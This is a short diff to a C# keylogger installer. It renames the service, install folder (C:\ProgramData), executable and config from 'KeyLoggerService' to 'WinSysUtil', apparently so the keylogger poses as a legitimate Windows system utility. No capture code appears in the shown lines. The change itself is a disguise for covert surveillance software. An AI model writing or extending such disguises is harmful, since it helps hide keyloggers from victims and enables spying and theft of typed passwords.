@@ -11,10 +11,10 @@ namespace KeyLoggerInstaller
 {
     static class Program
     {
-        private const string ServiceName = "KeyLoggerService";
-        private const string InstallDir = @"C:\ProgramData\KeyLoggerService";
-        private const string ExeName = "KeyLoggerService.exe";
-        private const string ConfigName = "KeyLoggerService.exe.config";
+        private const string ServiceName = "WinSysUtil";
+        private const string InstallDir = @"C:\ProgramData\WinSysUtil";
+        private const string ExeName = "WinSysUtil.exe";
+        private const string ConfigName = "WinSysUtil.exe.config";
 
         [STAThread]
         static void Main()
